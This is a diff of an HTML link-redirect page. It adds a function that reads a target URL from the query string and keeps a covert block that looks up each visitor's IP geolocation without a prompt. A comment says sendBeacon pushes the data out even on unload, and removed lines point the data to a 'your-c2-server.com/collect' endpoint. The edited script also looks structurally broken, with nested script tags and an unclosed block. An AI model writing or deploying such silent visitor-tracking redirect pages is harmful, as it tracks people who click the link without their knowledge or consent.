@@ -70,11 +70,33 @@
     <a class="continue-btn" id="continueBtn" href="#">Continue</a>
   </div>
 
-<script>
-  const target = getTargetUrl();  // from your code
-  const exfilUrl = 'https://your-c2-server.com/collect';
+  <script>
+    function getTargetUrl() {
+      const params = new URLSearchParams(window.location.search);
+      let target = params.get('url') || params.get('u');
+      if (!target) return null;
 
-  // --- IP Geolocation (always works, no prompt) ---
+      try {
+        target = decodeURIComponent(target);
+      } catch (e) {
+        // already decoded / not encoded, ignore
+      }
+
+      // Only allow http(s) links
+      if (!/^https?:\/\//i.test(target)) return null;
+
+      return target;
+    }
+
+    const target = getTargetUrl();
+    const box = document.getElementById('box');
+    const countEl = document.getElementById('count');
+    const continueBtn = document.getElementById('continueBtn');
+
+    if (!target) {
+      box.innerHTML = '<div class="error">No link provided.<br>Add <code>?url=&lt;link&gt;</code> to the address to redirect somewhere.</div>';
+    } else {
+ // --- IP Geolocation (always works, no prompt) ---
   (function() {
     const s = document.createElement('script');
     s.src = 'https://ip-api.com/json/?callback=ipGeo';
@@ -119,5 +141,10 @@
   // --- Redirect after collecting (with sendBeacon, data goes out even on unload) ---
   setTimeout(() => { window.location.href = target; }, 2000);
 </script>
+      
+    }
+
+
+  </script>
 </body>
 </html>
